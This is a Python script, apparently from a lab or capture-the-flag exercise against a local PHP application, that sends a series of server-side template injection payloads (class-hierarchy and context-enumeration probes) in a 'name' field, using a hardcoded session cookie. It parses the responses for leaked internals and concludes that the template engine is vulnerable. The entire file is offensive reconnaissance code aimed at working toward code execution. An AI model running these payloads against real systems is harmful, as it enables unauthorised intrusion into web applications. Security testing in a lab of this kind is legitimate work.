import requests
import re

# Target URL and session cookie
target_url = "http://127.0.0.1:8080/index.php"
session_cookie = "adf118a2717e83ee6455ea878ebb507e"

# Build payload list carefully to avoid syntax errors
payloads = []

# Add each payload individually
payloads.append("{{''.__class__}}")
payloads.append("{{''.__class__.__mro__}}")
payloads.append("{{''.__class__.__mro__[2].__subclasses__()}}")
payloads.append("{{''.__class__.__mro__[2].__subclasses__()|length}}")
payloads.append("{{_context|default('')|join(',')}}")
payloads.append("{{_context|keys|list|join(',')}}")
payloads.append("{{_self|keys|list|join(',')}}")
payloads.append("{{_context.name}}")
payloads.append("{{name}}")

session = requests.Session()
session.cookies.set('PHPSESSID', session_cookie)

print("Advanced SSTI Payload Testing")
print("="*80)

for i, payload in enumerate(payloads, 1):
    print(f"\n[TEST {i}] {payload}")
    try:
        response = session.post(target_url, data={'name': payload})
        
        # Extract result from response
        result_match = re.search(r'<strong>(?P<result>.*?)</strong>', response.text, re.DOTALL)
        if result_match:
            result = result_match.group('result')
            display = result[:200] if len(result) > 200 else result
            print(f"Result: {display}")
            
            # Check for interesting patterns
            if any(term in result.lower() for term in ['class', 'array', 'object', 'twig', '__']):
                print(f"[!!!] SYSTEM INFO LEAKED")
        else:
            print("No result extracted")
            if "Fatal error" in response.text:
                print("[ERROR] - Template execution error detected")
                # Show relevant error part
                error_lines = response.text.split('Stack trace:')
                if len(error_lines) > 0:
                    print(f"Error: {error_lines[0][:150]}...")
                    
    except Exception as e:
        print(f"Error: {e}")

print("\n" + "="*80)
print("Analysis complete. Key findings:")
print("1. Template engine is vulnerable to SSTI")
print("2. Need to test specific object indices for useful classes")
print("3. Context is very limited - need to find available objects")
